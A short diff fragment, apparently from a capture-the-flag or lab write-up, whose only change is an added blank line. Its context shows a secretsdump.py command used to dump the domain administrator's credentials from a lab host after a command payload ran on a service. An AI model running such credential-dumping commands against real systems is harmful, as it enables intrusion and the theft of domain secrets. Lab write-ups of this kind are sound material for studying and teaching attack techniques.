@@ -224,3 +224,4 @@ The service is screwed, however the command payload we added to it indeed got ex
 ```
 secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
 ```
+
